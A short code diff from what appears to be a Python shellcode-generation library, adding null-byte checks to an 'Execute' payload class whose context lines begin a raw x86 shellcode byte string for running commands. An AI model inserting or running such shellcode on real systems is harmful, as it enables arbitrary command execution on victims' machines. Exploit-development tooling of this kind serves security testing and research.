@@ -36,12 +36,18 @@ from shellgen import Dynamic
 # )
 
 class Execute (Dynamic):
-    qualities = ["payload", "term_null"]
+    qualities = "payload"
+    encoding  = "term_null"
 
     def __init__(self, command):
         self.command = command
+        if "\x00" in command:
+            raise ValueError("Cannot have null chars in command: %r" % command)
 
     def compile(self):
+        command = self.command
+        if "\x00" in command:
+            raise ValueError("Cannot have null chars in command: %r" % command)
         self._bytes = (
 "\xeb\x3d\x9a\x24\x24\x24\x24\x07\x24\xc3\x5e\x29\xc0\x89\x46\xbf\x88\x46\xc4"
 "\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x78\x29\xc0\x50\x56\x8d\x5e\x10"
